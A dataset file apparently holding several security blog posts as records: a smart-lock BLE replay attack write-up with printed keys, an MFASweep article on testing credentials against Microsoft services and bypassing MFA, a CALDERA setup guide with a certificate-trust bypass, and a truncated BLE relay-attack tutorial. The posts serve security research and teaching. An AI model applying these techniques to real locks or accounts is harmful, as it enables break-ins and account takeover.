nRF52840-DK, Sena's UD100 dongle, the Ubertooth-One and Texas Instruments CC2540 dongle. The problem with all of these approaches is they couldn't follow the connection due to Bluetooth Low Energy (BLE) channel hopping. The Nordic nRF52840-DK came close when using it together with Wireshark and Nordic's BLE sniffer plugin, but unfortunately, the packet captures were at the Link Layer (rather than the host controller interface layer) resulting in encrypted data that was unable to be parsed. \n\nBeing that it was not captured at the HCI layer, meant that it was susceptible to built in CCM AES-128 BLE security key exchange protocol handshakes. From what I could determine, this meant if the nRF52840-DK was not sniffing at the time of the pairing , it would miss the security handshake entirely, resulting in no decryption of the packets. \n\nIMPORTANT:  nRF Sniffer shortcoming!\n\nIt appears that if the KeyWe lock executes a channel hop after pairing, but before the App transmits the 1st packet, the nRF Sniffer will miss the initial CCM AES-128 BLE security key exchange. This would result in encrypted 'useless' packets. This is a shortcoming of the nRF Sniffer's inability to follow the channel map.  Note: the CCM AES-128 BLE security key exchange is a security protocol found in all Bluetooth Low Energy OTA wireless connections to prevent MiM eavesdropping.\n\nCCM AES-128 BLE security key exchange: (this is general information unrelated to the KeyWe project)\n\nThe temporary key is used during the Bluetooth pairing process. The short term key is used as the key for encrypting a connection the very first time devices pair. The short term key is generated by using three pieces of information: the Temporary Key, and two random numbers, one generated by the slave and one generated by the master\n\nOnce the connection is encrypted with the short term key, the other keys are distributed.  The Long Term Key replaces the short term key to encrypt the connection. The Identity Resolving Key is used for privacy. The Connection Signature Key is used for authentication.\n\nFortunately, there is an excellent way to capture Bluetooth traffic using your android device!\n\nOn your Android phone\n\nGo to settings\n\nIf developer options is not enabled, enable it now\n\nGo to developer options\n\nEnable the option Enable Bluetooth HCI snoop log\n\nPerform the actions which need to be captured (session)\n\nDisable the option Enable Bluetooth HCI snoop log\n\nCopy the file to PC using ADB (Android Debug Bridge)\n\nThe file of interest is btsnoop_hci.log\n\nNote: Typically, I'll leave the option Enable Bluetooth HCI snoop log enabled, as it's on my rooted test phone\n\nObtain btsnoop_hci.log of complete bluetooth session\n\nListed android files\n\nPulled btsnoop_hci log files\n\nRenamed btsnoop_hci.log to btsnoop_hci-07-31-20.log (appended with my session date)\n\nWIRESHARK ANALYSIS\n\nImporting the btsnoop_hci.log into Wireshark, we can see the OTA encrypted packet exchanges. This, in conjunction with the Frida function hexdumps provides a valuable way to cross-reference the activity of the user session. From the massive number of sessions generated during my research of the KeyWe lock, I can confirm these packet exchanges follow the same sequence every session and never vary in the least. In the following example, we can see the opening key exchange, initiated by the App and followed by the Door.\n\nEXAMPLE 1:  APP sends AppNumber  -- DOOR returns DoorNumber  --  DOOR sends Hello\n\nInteresting note: (in the screenshot above):  fb2b28c68b3f99c514b98fada4bf0b89  (transmission #2) can be decrypted with the CommonKey to reproduce the DoorNumber!\n\nThis can be verified by using the free online AES-128 Cipher tool here: http://aes.online-domain-tools.com/\n\nEnter the encrypted packet fb2b28c68b3f99c514b98fada4bf0b89  and enter the secret key (CommonKey) c88ff4150f4a4c27934a6c5e6741efac followed by clicking Decrypt\n\nUsing the online AES-128 Cipher tool is a handy way to correlate the Wireshark session data with the Frida hexdump data. The next few screenshots show examples of how the various Bluetooth OTA traffic coincides with the known function calls of the App. This provides us with an enormous amount of information regarding program flow and execution.\n\nExample 2: APP sends Welcome  --  DOOR sends START  --  APP and DOOR both exchange doorMode\n\nExample 3: APP sends eKey  --  DOOR sends eKey (authentication and authorization) \n\nExample 4: DOOR STATUS  --  doorTimeSet exchanges\n\nExample 5: DOOR STATUS exchanges\n\nREPLAY ATTACK\n\nAs can be seen by the screenshots (above), the entire Bluetooth session can be analyzed in Wireshark using the btsnoop_hci.log (capture) and compared side by side against the data found using the Frida tools. Also notice that every one of the encrypted packets being sent over the air (OTA) can be decrypted by simply determining the transport direction (App to Door or Door to App) and using the appropriate key (AppKey or DoorKey) to decrypt.\n\nNow that we have the keys and know how to interpret all of the data, we can attempt to operate the lock with a replay attack. Again, F-Secure provided a nice tool in their Github that they called 'open_from_pcap'. Based upon information in their pre-recorded pcap session, this tool allowed them to replay the session and operate the lock. Of course, this tool was rendered harmless when they REDACTED their keys.py script. However, as I stated earlier, I was eventually able to reverse engineer the functionality. So, by swapping F-Secure's REDACTED keys.py with my own version, it allowed me to implement the 'open_from_pcap' tool on my btsnoop_hci.log capture.\n\nUsing my Sena UD100 Bluetooth USB adapter, the first result of running the 'open_from_pcap' script appears below:\n\nApparently, my modified keys.py correctly determined the CommonKey,  AppKey and DoorKey, but failed at the eKeyVerify stage.\n\nWithout getting too deep into F-Secure's coding, the open_from_pcap python script calls a function in another script (decode_from_pcap) which supposedly retrieves the eKey from the session pcap. Unfortunately, that did not work properly for me. Maybe it was related to a difference in format structure of their pcap file versus my btsnoop_hci.log file (saved as pcap from within a Wireshark session), Regardless, I decided to forego the deciphering of their code and instead modified the 'open_from_pcap' file to use my hardcoded eKey rather than trying to retrieve it. \n\nBy the way, the reason that the F-Secure people needed to retrieve the key from the pcap, is because the eKey is stored online when the account is created and not present in any OTA transmissions. It is however detectable using Frida, by injecting a javascript into the eKeyVerify function which provides a hexdump of the return value (see below).\n\nAs you can see from the screenshot above, as part of my testing, I decided to delete my (OLD) KeyWe account and create a (NEW) account. By doing so, I might be able to determine what changes occur from one user account to another, and if the eKey might be predictable. From what I can see, there are no obvious detectable patterns. The eKey (also known as the User password) is generated when the owner creates their account, so it makes sense that the key is totally randomized and potentially derived from the User Password during account setup. Also, when I created the new account, I  intentionally changed only one character in the original password. My intention here was that this might help me determine if the eKey was derived solely from the User Password. In my opinion, it appears it was not.\n\nFrom the screenshot above, it seems pretty clear that the eKeyVerify function was called by the App and the argument passed was a 6-byte value (eKey). The returned value can be assumed to be a modified resultant eKey to be sent by the App  (encrypted with the AppKey) to the Door. Without digging deeper into the code, I can only assume that the 6-byte value (eKey) provides a link to the actual (modified) eKey stored away. Regardless, this 6-byte eKey is all that's required to complete the replay session.\n\nHard-coding the eKey into the replay.py script resulted in the following replay session:\n\nSUCCESS!! \n\nThis replay was successful because I was able to obtain the eKey (used for authentication and authorization) by extracting it from my rooted phone using Frida. As it stands right now, this replay attack would not work in the wild due to the fact that the eKey of a legitimate owner is not accessible in this manner. Likewise, as I stated earlier, the eKey is not transmitted OTA.\n\nWell, that statement is not entirely true! \n\nConsider the following snippet captured by my phone's btsboop_hci.log and the corresponding Frida hexdump of the eKeyVerify function:\n\nThe Wireshark capture shows the opening packet transfers (key exchanges, handshakes, etc). Pay close attention to the 8th packet in this session. It shows the encrypted packet sent by the App containing the modified eKey value. From the Frida hexdump, notice also that the 6-byte eKey value is enumerated into bytes (5:11) of the modified eKey value.\n\nBased upon our learned knowledge of how this packet is encrypted before transmission, we know that it will be an AES-128 cipher using the AppKey as the secret key. \n\nUsing the online AES-128 Cipher tool to decrypt the 8th OTA encrypted packet:  46402315a85a72e66e9671d044b513af using the AppKey:  e022c1193ebb3882efc9cf79b6e557d1 as the secret key, we would get the decrypted modified eKey.  And as we know, the 6 byte eKey value is enumerated into bytes (5:11) of the decrypted modified eKey value. (See below)\n\nThis little exercise clearly shows that if we can do an OTA capture of the opening packet exchange of a legitimate owner in the wild, we would have everything we need (including their User Password - eKey) to compromise their home security and unlock their door!\n\nSUMMARY\n\nI have to admit that I spent an enormous amount of time with my research (in the order of a few months) on this project, mainly because of dealing with the heavy obfuscation of the code, but also due to the learning curve involved with learning any new tool.  Getting familiar with the Frida tool and a few of its many features and implementations was one of the high points of this project for me. Furthermore, it was equally rewarding to be able to reverse engineer an Android application, while realizing it has been over a year since the F-Secure advisory was issued and the vendor having had sufficient opportunity to mitigate what they could. Inasmuch, I strongly agree with the findings of the F-Secure researchers, in that firmware update capability would certainly have mitigated a great deal of their exposure and that using custom (In-house) crypto algorithms is never a good idea. \n\nI'll close out this write-up by saying that I still have some unfinished research to deal with, that being an OTA capture of a session between my non-rooted personal phone and the KeyWe lock, in order to create a replay attack that WILL work in the wild. Regardless, to mitigate their exposure, I strongly recommend that current owners of the Guardtec KeyWe Smart Lock upgrade their Mobile Application to the latest release as soon as possible (version 2.1.0 at the time of this writing).\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Exploiting MFA Inconsistencies on Microsoft Services\"\nTaxonomies: \"Author, Beau Bullock, How-To, Informational\"\nCreation Date: \"Tue, 29 Sep 2020 12:06:00 +0000\"\nBeau Bullock //\n\nOverview\n\nOn offensive engagements, such as penetration tests and red team assessments, I have been seeing inconsistencies in how MFA is applied to the various Microsoft services. Across Microsoft 365 and Azure, there are multiple endpoints. These endpoints can all be configured under different Conditional Access policy settings, which sometimes lead to variations in how MFA is applied. An organization that is trying to prevent single-factor access to email and/or Azure may need to double-check their configurations to ensure MFA is enforced on all access portals. \n\nTo help both offensive operators and defenders check for MFA coverage on an account, I wrote a tool called MFASweep that attempts to log in to various Microsoft services using a provided set of credentials to identify if MFA is enabled. To jump straight to the tool, click here: https://github.com/dafthack/MFASweep\n\nMicrosoft MFA \n\nMicrosoft 365 and Azure have built-in MFA options. Even free Microsoft accounts can use the MFA features. More and more organizations are implementing MFA across accounts. Microsoft MFA has a few different options for verification:\n\nMicrosoft Authenticator app\n\nOAUTH Hardware token\n\nSMS\n\nVoice call\n\nDuring offensive engagements, we commonly perform password attacks such as password spraying or credential-based phishing. Oftentimes, if we successfully compromise a credential, MFA can put a stop to any further activities. However, as shown in this blog post, administrators have a lot of options to consider in terms of how that MFA is applied and where. This can lead to misconfigurations and inconsistencies in MFA coverage.\n\nSecurity Defaults\n\nWhen an organization signs up for Microsoft 365, it uses Azure AD as the directory for users. Azure AD has a setting that is enabled by default called \u201cSecurity Defaults\u201d. Security Defaults is a setting that helps protect Microsoft accounts by doing the following:\n\nRequires all users to register for Azure Multi-Factor Authentication (users have 14 days to register by default with the Authenticator app).\n\nRequires administrators to perform multi-factor authentication.\n\nBlocks legacy authentication protocols (EWS, IMAP, SMTP, or POP3, etc.).\n\nRequires users to perform multi-factor authentication when necessary.\n\nProtects privileged activities like access to the Azure portal.\n\nThese settings tremendously help to protect access to an account. Misconfigurations can arise when this setting gets disabled\u2026 So why would you disable it? Well, as it turns out you can\u2019t have \u201cSecurity defaults\u201d enabled if you are also using Conditional Access policies. \n\nConditional Access Policies\n\nConditional Access policies are the fine-grained controls over how a user is granted access to a resource. These also can control when and where MFA is applied. Conditional Access policies can be built around a number of different scenarios, such as the user who is authenticating, the location they are coming from, the device they are using, their \u201creal-time risk\u201d level, and more. \n\nFor example, I have tested organizations that utilized conditional access policies to allow single-factor access to Microsoft 365 from their IP space, but required MFA everywhere else. \n\nWhen setting up Conditional Access policies, an admin has a number of different options to consider. Do users need to authenticate to legacy protocols or will they only be using modern authentication? Will they be authenticating from their phones, desktops, or both? Will they be allowed to connect from home or only on-prem? The ability for admins to allow or block certain protocols is where differences in MFA implementations are commonly seen across different organizations. Some organizations I have done assessments for allow authentication to all the common portals, while others lock access down tightly. \n\nOne of the more common areas I have seen single factor sneak into place is on legacy authentication-protocols. Microsoft defines the following list as \u201clegacy\u201d:\n\nAuthenticated SMTP - Used by POP and IMAP clients to send email messages.\n\nExchange ActiveSync (EAS) - Used to connect to mailboxes in Exchange Online.\n\nAutodiscover - Used by Outlook and EAS clients to find and connect to mailboxes in Exchange Online.\n\nExchange Online PowerShell - Used to connect to Exchange Online with remote PowerShell. If you block Basic authentication for Exchange Online PowerShell, you need to use the Exchange Online PowerShell Module to connect. For instructions, see Connect to Exchange Online PowerShell using multi-factor authentication.\n\nExchange Web Services (EWS) - A programming interface that is used by Outlook, Outlook for Mac, and third-party apps.\n\nIMAP4 - Used by IMAP email clients.\n\nMAPI over HTTP (MAPI/HTTP) - Used by Outlook 2010 and later.\n\nOffline Address Book (OAB) - A copy of address list collections that are downloaded and used by Outlook.\n\nOutlook Anywhere (RPC over HTTP) - Used by Outlook 2016 and earlier.\n\nOutlook Service - Used by the Mail and Calendar app for Windows 10.\n\nPOP3 - Used by POP email clients.\n\nReporting Web Services - Used to retrieve report data in Exchange Online.\n\nOther clients - Other protocols identified as utilizing legacy authentication.\n\nAccess can be blocked to these via a Conditional Access policy applied to the \u201cLegacy authentication clients\u201d in the \u201cClient apps\u201d setting. \n\nLegacy Authentication End-of-Life\n\nThe good news is that Microsoft is planning on disabling legacy authentication. The bad news is that due to COVID-19, the date for disabling it has moved back to the 2nd half of 2021. So, it looks like we\u2019ll be checking for legacy authentication for a while longer.\n\nhttps://techcommunity.microsoft.com/t5/exchange-team-blog/basic-authentication-and-exchange-online-april-2020-update/ba-p/1275508\n\nMFASweep\n\nDue to the variations I have been seeing in different organizations\u2019 MFA setups on Microsoft Services, I wrote a tool to automate authenticating to some of the different protocols. MFASweep is a PowerShell script that attempts to log in to various Microsoft services using a provided set of credentials and will attempt to identify if MFA is enabled. Depending on how conditional access policies and other multi-factor authentication settings are configured, some protocols may end up being left single factor (and this will tell you which ones). It also has an additional check for ADFS configurations and can attempt to log in to the on-prem ADFS server if detected.\n\nCurrently, MFASweep has the ability to log in to the following services:\n\nMicrosoft Graph API\n\nAzure Service Management API\n\nMicrosoft 365 Exchange Web Services\n\nMicrosoft 365 Web Portal\n\nMicrosoft 365 Web Portal Using a Mobile User Agent\n\nMicrosoft 365 Active Sync\n\nADFS\n\nAll you need is a set of valid credentials and the script. Import the script into a PowerShell session, then run one of the commands below. \n\nWARNING: This script attempts to log in to the provided account SIX (6) different times (7 if you include ADFS). If you enter an incorrect password, this may lock the account out.\n\nThis command will use the provided credentials and attempt to authenticate to the Microsoft Graph API, Azure Service Management API, Microsoft 365 Exchange Web Services, Microsoft 365 Web Portal (both desktop and mobile browsers), and Microsoft 365 Active Sync.\n\nInvoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020\n\nThis command runs with the default authentication methods and checks for ADFS as well.\n\nInvoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Recon -IncludeADFS\n\nIf you run MFASweep and find you have access to a certain Microsoft protocol, you may be wondering what you can do with that access. The next few sections give a quick overview of what you might be able to do. \n\nMicrosoft Graph API\n\nOne of the best ways for working with the Graph API is to use the MSOnline PowerShell module. The Graph API is primarily tied to Azure AD. This allows you to view information from the directory such as users and groups. To authenticate with MSOnline, import the MSOnline PowerShell module and then run Connect-MsolService. This will open the built-in PowerShell browser for authentication.\n\nImport-Module MSOnline\nConnect-MsolService\n\nOr... try passing the credential to a PowerShell variable first and then use the -Credential flag with Connect-MsolService. I have seen where authenticating via this method bypassed some MFA restrictions.\n\n$credential = Get-Credential\nConnect-MsolService -Credential $credential\n\nFor a list of some commands to run after authenticating, see my cloud pentesting cheat sheets here: https://github.com/dafthack/CloudPentestCheatsheets\n\nROADTools should work here as well: https://github.com/dirkjanm/ROADtools\n\nAzure Service Management API\n\nIf the user has a subscription tied to their account, you can leverage the Azure Service Management API to perform actions within the subscription. To do this you could use the \u201cAz\u201d PowerShell module. You can import it and authenticate with the command Connect-AzAccount.\n\nImport-Module Az\nConnect-AzAccount\n\nSimilar to the MSOnline module, you could also use a PowerShell variable and pass it to Connect-AzAccount with the -Credential flag. The cloud pentesting cheat sheets mentioned in the Microsoft Graph section should be useful here as well.\n\nMicrosoft Exchange Web Services (EWS)\n\nAccess to EWS allows for reading a user\u2019s email, getting the global address list, converting email addresses to internal AD usernames, and more. You can use MailSniper to perform these actions: https://github.com/dafthack/MailSniper. When using MailSniper with EWS on Microsoft 365, make sure to use the -Remote flag as shown in the following command for authentication.\n\nInvoke-SelfSearch -Mailbox targetuser@targetdomain.com -ExchHostname outlook.office365.com -Remote\n\nMicrosoft 365 Web Portal\n\nLog in with a browser at https://outlook.office365.com or https://portal.azure.com.\n\nMicrosoft 365 Web Portal via Mobile Devices\n\nOne conditional access policy I have seen organizations use allowed users to access O365 with a mobile device using single-factor authentication, but trying in a desktop client required MFA. This was set up using \u201cDevice platforms\u201d as the condition. As documented by Microsoft, the device platform is identified by user agent so simply changing the user agent to a common mobile device can trigger this policy.\n\nIn the screenshot below, I attempted to log in to an account via desktop web browser with a conditional access policy in place that only allowed mobile devices, so MFA was required.\n\nIn the next screenshot, I tried logging in to the same account after I changed my user agent using Chrome\u2019s built-in developer tools feature to mimic an Android device. This time, MFA was not required.\n\nShoutout to Nikhil Mittal for his tweet about this: https://twitter.com/nikhil_mitt/status/1287049649363144705\n\nMicrosoft 365 ActiveSync\n\nActiveSync is treated as a separate \u201cClient app\u201d in Conditional Access policies instead of being lumped in with the other legacy protocols like IMAP, EWS, etc. So, there is potential there for legacy protocols like EWS to be blocked but access to ActiveSync is allowed. Windows 10 has a built-in Mail application that supports ActiveSync. To do this, open Mail in Windows 10 and add an account. Click \u201cAdvanced setup\u201d. \n\nThen, click \u201cExchange ActiveSync\u201d.\n\nFill out the information as shown in the screenshot below and click \u201cSign in\u201d. This should set up ActiveSync to start syncing email with the user\u2019s account.\n\nADFS\n\nActive Directory Federation Services is another common method for authenticating users that we see deployed. With ADFS, no credentials are stored in Azure. When a user attempts to authenticate to Microsoft Online services, such as Microsoft 365, a redirect occurs to a system hosted by the organization where authentication can occur. One quick way to check if an organization has ADFS set up is to send a web request to the following URL substituting the \u201ctargetuser@targetdomain.com\u201d for any email address at the domain you are testing (whether or not the user account exists doesn\u2019t matter, just the domain): \n\nhttps://login.microsoftonline.com/getuserrealm.srf?login=targetuser@targetdomain.com&xml=1\n\nI added in a check for this into MFASweep. The script automatically prompts asking if you want to check the domain for ADFS, or you can specify the -Recon flag to force it.\n\nThe script also can attempt to log into the ADFS server, letting you know if MFA is configured there. \n\nConclusion\n\nBefore I released this tool, I used it on a few real world engagements and found inconsistencies in MFA deployments that allowed me to gain access to information that was supposed to be protected. I think that both red teamers and blue teamers can use this tool to gain a better understanding of the MFA coverage deployed to accounts. Keep in mind these are not the only conditions possible. With conditional access, there are other possibilities for how it can be configured, and multiple options can be combined to create more complex rules. The checks I\u2019ve included in MFASweep are some of the more common scenarios I have seen on engagements, but there will likely be more added in the future. If there are any other checks you would like to see in MFASweep, send me a DM on Twitter and let me know!\n\nGet MFASweep here: https://github.com/dafthack/MFASweep\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Install Mitre CALDERA and Configure Your SSL Certificate\"\nTaxonomies: \"How-To, Informational\"\nCreation Date: \"Wed, 21 Oct 2020 17:31:39 +0000\"\nCarrie & Darin Roberts //\n\nIf you would like to install the Mitre CALDERA server on your own, the CALDERA GitHub page has installation instructions on their ReadMe here. Detailed steps are provided below for installing CALDERA on Ubuntu and configuring it to use your SSL certification.\n\nClone the Repository\n\ngit clone https://github.com/mitre/caldera.git --recursive --branch 2.8.1\n\nChange directories into the \u201cCALDERA\u201d directory\n\ncd caldera\n\nInstall PIP and the PIP requirements:\n\nsudo apt install -y python3-pip\npip3 install -r requirements.txt\n\nInstall Go\n\nInstalling Go is technically optional but it makes it so that agent executables are dynamically compiled and they avoid AV detection much better.\n\nDownload Go from https://golang.org/doc/install\n\nExtract the downloaded file (your filename may vary)\n\nsudo tar -C /usr/local -xzf go1.15.2.linux-amd64.tar.gz\n\nUpdate your PATH\n\nAdd the following line to your $HOME/.bashrc file:\n\nexport PATH=$PATH:/usr/local/go/bin\n\nClose the terminal and reopen to have the PATH changes take effect, or use the \u201csource ~/.bashrc\u201d command.\n\nConfirm that GO is properly installed by checking its version.\n\ngo --version\n\nStart the server\n\nCreate a copy of the CALDERA config file called local.yml and then edit it to set your own users and secure passwords.\n\ncp ~/caldera/conf/default.yml ~/caldera/conf/local.yml\n\nEdit the local.yml file to change the usernames and passwords shown below to something more secure.\n\nStart the CALDERA server.\n\npython3 server.py\n\nSetup SSL Communications for the CALDERA Web Interface\n\nIf your CALDERA web interface is reachable over an untrusted network, you should enable encrypted communications as instructed below.\n\nThe encrypted communications are handled by the HAProxy tool. Install HAProxy as follows.\n\nsudo apt update\nsudo apt install haproxy\n\nAfter logging in to the CALDERA web interface on localhost:8888, go to the Advanced-->Configuration menu.\n\nFrom the configuration menu enable the SSL plugin. You can now reach the CALDERA web interface at https://:8443.\n\nYou also need to update your app.contact.http setting from the CALDERA web interface (advanced-->configuration) to include https as shown below. (update with the IP or domain name of your server)\n\nNote: Make sure you do not include a trailing slash (/) on the URL.\n\nDon\u2019t forget to click the green \u201cupdate\u201d button and restart the server after making the configuration changes.\n\nNow that we have configured the app.contact.http setting, we will see updated commands for deploying an agent using the http contact method (54ndc47 for example)\n\nBy default, a self signed certificate is used for the SSL encryption. Replace the self-signed certificate at ~/caldera/plugins/ssl/conf/insecure_certificate.pem with your own if desired.\n\nNeed to create your own signed/trusted certificate? Try using Let\u2019s Encrypt. You will need to own a domain name and configure a DNS authoritative record to point to your CALDERA server\u2019s IP address.\n\nTo use your own trusted cert create a combined pem file using the commands to below.\n\ncd /etc/letsencrypt/live/\ncat cert.pem privkey.pem > ~/caldera/plugins/ssl/conf/insecure_certificate.pem\n\nRestart the CALDERA server after making these changes.\n\nIf you use the self-signed cert, any PowerShell commands you run to get a remote agent are going to complain about not being able to establish a trust relationship. You will need to bypass the trust check by running the PowerShell commands below before you execute the agent command. (this only applies if you are using the default self-signed cert)\n\nclass TrustAllCertsPolicy : System.Net.ICertificatePolicy {        [bool] CheckValidationResult([System.Net.ServicePoint] $a,            [System.Security.Cryptography.X509Certificates.X509Certificate] $b,            [System.Net.WebRequest] $c,            [int] $d) {            return $true        }    }    [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()\n\nNow your CALDERA SERVER is fully set up and ready to be put to use. Check out the \"Attack Emulation: Atomic Red Team, CALDERA, and More\" class to learn more about using Mitre CALDERA, including over 25 hands-on labs. https://wildwesthackinfest.com/online-training/attack-emulation-atomic-red-team-caldera-and-more/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Machine-in-the-Middle (MitM) BLE Attack\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, Hardware Hacking, How-To, Informational, InfoSec 101, Ray Felch\"\nCreation Date: \"Wed, 28 Oct 2020 15:19:41 +0000\"\nRay Felch //\n\nIntroduction\n\nContinuing with my ongoing Smart Lock attack research (see blog Reverse Engineering a Smart Lock), I decided to move my focus to a different type of attack technique, namely a relay attack. The relay attack is a form of MitM attack, not to be confused with the more well-known replay attack.  \n\nMitM attacks commonly involve intercepting data between two parties in order to view/modify that data before relaying it on to the intended recipient. MitM attacks consist of controlling the back-and-forth communication between the two unsuspecting parties. The parties think that they are talking to each other, however, in reality, the conversation is being proxied by the MitM attacker. The intercepted messages can be modified by the attacker or left unaltered, depending on the intentions of the attacker.\n\nUnlike a MitM attack, a replay attack is a type of attack where an attacker captures the wireless communication of a legitimate device in order to replay it (typically unaltered)  at a later time when the owner is not around. An example of a replay attack might be an attacker capturing the signal of the keyless remote which opens a door lock, in order to replay it later when the victim is not at home.\n\nThe relay attack, on the other hand, is a form of MitM attack where an attacker surreptitiously relays communication from one legitimate device to another legitimate device without the knowledge of the transmitter beyond the engineered communication distance limitations. An example of this might be where an attacker captures the RF signal of a nearby key-fob and forwards it to an accomplice near the targeted vehicle to unlock the door. This appears to be the type of attack used recently where two attackers in London stole a Tesla Model S in under 30 seconds. \n\nhttps://www.pcmag.com/news/tesla-model-s-stolen-in-30-seconds-using-keyless-hack\n\nProof of Concept\n\nFor my MitM research, I chose to stay with the KeyWe smart lock, as I was already familiar with its operation and features, and the lock is typical of the commercial smart locks currently on the market. Just as a reminder, the KeyWe Smart Lock is made by Guardtec and uses Bluetooth Low Energy (BLE) to communicate with its mobile app on Android or iOS phones. It was successfully exploited back in December of last year by F-Secure, and more recently by myself. Inasmuch, the vendor has implemented a few steps to mitigate its exposure and has heavily obfuscated their code. However, this is where a properly constructed MitM attack can really shine! Many times, MitM attacks are not concerned with the inner workings of the firmware or the mobile application, as they are simply intercepting the communication of two legitimate devices in real-time and passing (relaying) the information unmodified.\n\nFor this example, our MitM relay attack consists of spoofing the targeted peripheral (the KeyWe lock, in our case) in order to get the victim's device (phone) to connect to our fake peripheral device. On connection, the fake peripheral relays the victim's phone packets onward to the targeted device (lock) while at the same time monitoring and capturing the exchanged traffic. In this scenario, the fake peripheral and companion device handle the relaying of the 'back and forth' traffic,  while the victim is completely unaware that the session is being intercepted.\n\nHardware requirements\n\n(2) Raspberry Pi 3B+ \n\n(2) Kinivo BTD-400 Bluetooth Low Energy Adapters\n\nKeyWe Smart Lock (or other BLE smart device, August Lock, etc)\n\nSoftware requirements\n\nPrerequisites\n\nNoble: https://github.com/noble/noble\n\nBleno: https://github.com/noble/bleno\n\nGATTACKER: https://github.com/securing/gattacker\n\nNodeJS (Version 8.xx.x only)\n\nNote: I ran into a number of issues using the very latest version of NodeJS, and found that the most stable version (with regard to the Gattacker tool) was version 8.xx.x \n\nAlso, I discovered that using NVM (Node Version Manager) helps tremendously in maintaining compatibility between often deprecated applications/tools.\n\nPrepare both Raspberry Pi's\n\nCreate a fresh raspbian (Buster) image, install to two SD cards using balenaEtcher\n\nCopy a blank SSH file to the boot directory of the SD cards (to allow headless operation via ssh)\n\nInsert SD cards into the two RPi's and power-up\n\nOpen two terminals on a laptop, one for each Pi\n\nDetermine IP address for each RPi (I created static IP's for ease of use)\n\nssh pi@192.168.1.21 (Central Pi) and ssh pi@192.168.1.22 (Peripheral Pi)\n\nMake sure your RPi is up to date and has all the dependencies installed (fresh install recommended)\n\n$ sudo apt update\n$ sudo apt dist-upgrade -y\n$ sudo apt install python-dev build-essential curl git mc -y\n\nNodeJS\n\nNodejs is an open-source, asynchronous 'event-driven', cross-platform JavaScript runtime environment, used to build network applications.\n\nInstall node version manager (nvm)\n\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.36.0/install.sh | bash\nnano ~/.bashrc\n\nappend to end of bashrc file:\n\nexport NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"  # This loads nvm\n[ -s \"$NVM_DIR/bash_completion\" ] && \\. \"$NVM_DIR/bash_completion\"  # This loads nvm bash_com\n\n$ source ~/.bashrc\n$ nvm -v  (verify version - should be 0.35.3 or higher)\n\nInstall NodeJS (version 8.x.x)\n\n$ nvm install 8.0.0    (Note: I used 8.17.0 for my attack, but 8.0.0 should be okay, although not verified)\n\n$ which node    (get path to node)\n/home/pi/.nvm/versions/node/v8.0.0/bin/node\n\nAdd path to ~/.profile:\n\n# nodejs path\nexport PATH=/home/pi/.nvm/versions/node/v8.0.0/bin/node:$PATH\n\nVerify correct node version:\n\n$ node -v     (verify node version is 8.0.0)\n$ sudo node -v    (verify node version is 8.0.0 - added to help prevent \"incorrect node version\" error condition)\n\nImportant update: It appears that the latest release of raspbian (Buster) installs node version 10.21.0 as root by default, and unfortunately nvm (node version manager) does not work with the sudo command. After an exhaustive search for a solution, I discovered an alternative 'node version manager' known as 'n' would work and allow me to change the root node version from 10.21.0 to 8.0.0. It is important that the root and non-root node versions be identical due to the need to execute a sudo-based command later in the attack (specific to the Bluetooth hardware control interface of the BLE adapter). Incorrect node versions will throw a 'node version mismatch' error when that sudo command is executed.\n\nInstall 'n' (node version manager)\n\n$ npm install -g n  \n\nOnce installed, n caches node versions in subdirectory n/versions of the directory specified in environment variable N_PREFIX, which defaults to /usr/local; and the active node version is installed directly in N_PREFIX.\n\n# make cache folder (if missing) and take ownership\n\nsudo mkdir -p /usr/local/n\nsudo chown -R $(whoami) /usr/local/n\n\n# take ownership of node install destination folders\n\nsudo chown -R $(whoami) /usr/local/bin /usr/local/lib /usr/local/include /usr/local/share\n\n# 'n' node version manager is now installed and configured\n\nn 8.0.0    (this will change root node version to 8.0.0 as required)\n\nBluetooth Dependencies\n\n$ sudo apt install bluetooth bluez libbluetooth-dev libudev-dev -y\n\n$ npm install noble        (Central nodejs module)\n$ npm install bleno        (Peripheral nodejs module)\n$ npm install gattacker    (Bluetooth BLE security assessment tool for MitM attack)\n\nAttack overview\n\nThis relay attack infrastructure consists of two raspberry pi's connected over wifi and using Gattacker (nodejs package for Bluetooth Low Energy security assessment) for web-socket traffic. The Central Pi on the left is the web-socket slave (with regard to the attack vector), and needs to be as close to the target (lock) as possible. The Peripheral Pi on the right is the web-socket master (with regard to the attack vector), and needs to be as close to the victim (phone) as possible. Note: The attached RPi's BLE adapters need to be sufficiently apart from each other for the attack to work reliably (outside the typical range of BLE, or approximately 30 meters).\n\nGATTACKER module configuration\n\nThe way it works:\n\nOn the Central Pi, (RPi-1) we run the command 'node ws-slave' which puts RPi-1 into the listen mode on the localhost.\n\nOn the Peripheral Pi (RPi-2) we will be executing all of our node commands, beginning with command #1, 'node scan' which prompts the Central-Pi to listen for all BLE advertisement beacons in the vicinity and record them to a JSON file.\n\n(Click for full-size)\n\nAs can be seen in the above screenshots, the Central Pi has discovered a couple of BLE advertising beacons.  Device #1 advertises its mac address (peripheral ID) as 6F:64:C1:87:E8:E1, its address type as 'random', and its connectable state as 'true'. \n\nDevice #2 advertises its mac address (peripheral ID) as 6B:D7:78:E8:9b:66, its address type as 'random', and its connectable state as 'true'. \n\nAnother interesting piece of information is the \"RSSI\" (received signal strength indication). This value can be used to indicate how close we are to the source. The higher the number is (more positive), the closer we are to the device. \n\nDevice #3 advertises its mac address (peripheral ID) as 8C:C8:F4:0F:4C:93, its address type as 'public' and its connectable state as 'true'. The \"RSSI\" of device #3 is -61, indicating it is probably closer to the Central Pi than devices #1 or #2.\n\nInteresting fact: As of Android version 8 (iOS version 14), smartphones will hide their actual mac address (by default) in order to prevent listeners from using their actual mac addresses to build a history of device activity and/or for tracking purposes. The way they hide their mac address is by generating random mac addresses for connecting to networks. It's fairly easy to determine if a mac address is random by looking at the 2nd digit of the OUI (Organizationally Unique Identifier) portion of the mac address. \n\nIf bit-1 (local bit) of the second digit is set, 